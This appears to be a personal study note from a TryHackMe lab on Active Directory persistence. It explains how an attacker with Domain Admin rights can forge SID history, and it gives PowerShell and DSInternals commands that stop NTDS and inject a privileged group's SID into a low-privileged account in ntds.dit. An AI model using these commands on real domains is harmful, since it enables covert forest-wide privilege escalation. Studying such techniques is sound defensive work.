# Active Directory SID History


The Security IDentifiers (SIDs) are used to track the security principal and the account's access when connecting to resources check: [[Windows-Accounts]] for more details. The have an attribute called SID history is use to enable access for an account to effectively be cloned to another. It help is AD migrations, as the user can still access the previous domains. While SID history is a great persistence technique, credential rotation and cleanup can still remove our persistence.

## Forging History

SID history are not restricted to only including SIDs from other domains therefore we can add a SID of our current domain to the SID history of an account we control.
- Requires Domain Admin privileges or the equivalent
- When the account creates a logon event, the SIDs associated with the account are added to the user's token, which then determines the privileges associated with the account. This includes group SIDs.
- We can inject the Enterprise Admin SID to elevate the account's privileges to effective be Domain Admin in all domains in the forest.
- Very Stealthy - SIDs are added to the user's token, privileges would be respected even if the account is not a member of the actual group. It would look like a normal user in Domain Users group but with Enterprise Admin privileges - can alter a current normal user with these privileges for extra subterfuge.

```powershell
Get-ADUser $username -properties sidhistory,memberof # Check history, get sid
Get-ADGroup "Domain Admins" # SID of Domain Admins Group

Stop-Service -Name ntds -force 
# the latest version of Mimikatz has a flaw that does not allow it to patch LSASS to update SID history
# https://github.com/MichaelGrafnetter/DSInternals tool to patch the ntds
Add-ADDBSidHistory -SamAccountName 'username of our low-priveleged AD account' -SidHistory 'SID to add to SID History' -DatabasePath C:\Windows\NTDS\ntds.dit 
Start-Service -Name ntds  
```

## References

[THM AD Persistence Room](https://tryhackme.com/room/persistingad)